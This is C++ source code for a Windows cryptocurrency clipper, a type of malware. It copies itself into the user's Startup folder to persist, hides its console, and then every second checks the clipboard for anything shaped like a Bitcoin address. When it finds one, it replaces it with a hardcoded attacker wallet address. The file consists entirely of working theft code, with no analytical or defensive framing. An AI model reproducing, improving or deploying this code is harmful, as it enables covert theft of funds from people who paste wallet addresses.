#include <windows.h>
#include <iostream>
#include <Lmcons.h>
#include <string>
#include <conio.h>
#include <cstdlib>
#include <chrono>
#include <thread>
using namespace std;

void runFile(string newFile, string command) {
	system(command.c_str());
	cout << ">PATH OF FILE COPIED TO STARTUP: " << command << endl;
}

void console() {
	HWND console;
	AllocConsole();
	console = FindWindowA("ConsoleWindowClass", NULL);
	ShowWindow(console, 0);
}

char* getClip() {
	OpenClipboard(NULL);
	HANDLE data = GetClipboardData(CF_TEXT);
	CloseClipboard();
	LPVOID lptstr = GlobalLock(data);
	return (char*)data;
}

void setAddress(char* data, const size_t len, const char* address, string startCommand) {
	try {
		HGLOBAL hText;
		char* pText;
		hText = GlobalAlloc(GMEM_DDESHARE | GMEM_MOVEABLE, len);
		pText = (char*)GlobalLock(hText);
		strcpy(pText, data);
		GlobalUnlock(hText);
		string check = (char*)data;
		long long int cLen = strlen(check.c_str());
		if (cLen > 26 && cLen < 35) {
			if (check[0] == '1' && check != address || check[0] == 'b' && check != address || check[0] == '3' && check != address) {
				cout << ">ADDRESS CHANGED KEKW ><" << endl;
				HGLOBAL tmp = GlobalAlloc(GMEM_MOVEABLE, len);
				memcpy(GlobalLock(tmp), address, len);
				GlobalUnlock(tmp);
				OpenClipboard(NULL);
				EmptyClipboard();
				SetClipboardData(CF_TEXT, tmp);
				CloseClipboard();
			}
			else {
				cout << ">LEN MATCHES BUT NOT BTC ADDRESS" << endl;
				throw(cLen);
			}
		}
		else {
			cout << ">NOTHING MATCHES" << endl;
			throw(cLen);
		}
	}
	catch(long long int len) {
		system(startCommand.c_str());
		cout << ">TOO MUCH LENGTH: " << len << endl;
	}
}


int main() {
	char fileName[MAX_PATH];
	char username[UNLEN + 1];
	DWORD length = UNLEN + 1;
	GetUserName(username, &length);

	string newFile;
	string first = "'C:\\Users\\";
	string second = "\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\asd.exe'";

	newFile = first + username + second;
	GetModuleFileNameA(NULL, fileName, sizeof(fileName));

	string cp = "cp ";
	string null = " ";
	string start = "start";
	string command = cp + fileName + null + newFile;
	string startCommand = start + newFile;

	runFile(newFile, command);
	console();
	const char* address = "14qViLJfdGaP4EeHnDyJbEGQysnCpwk3gd";
	const size_t len = strlen(address) + 1;
	if (!OpenClipboard(NULL))
		cout << ">CAN'T OPEN CLIPBOARD" << endl;
	while (1) {
		setAddress(getClip(), len, address, startCommand);
		this_thread::sleep_for(1s);
	}
}
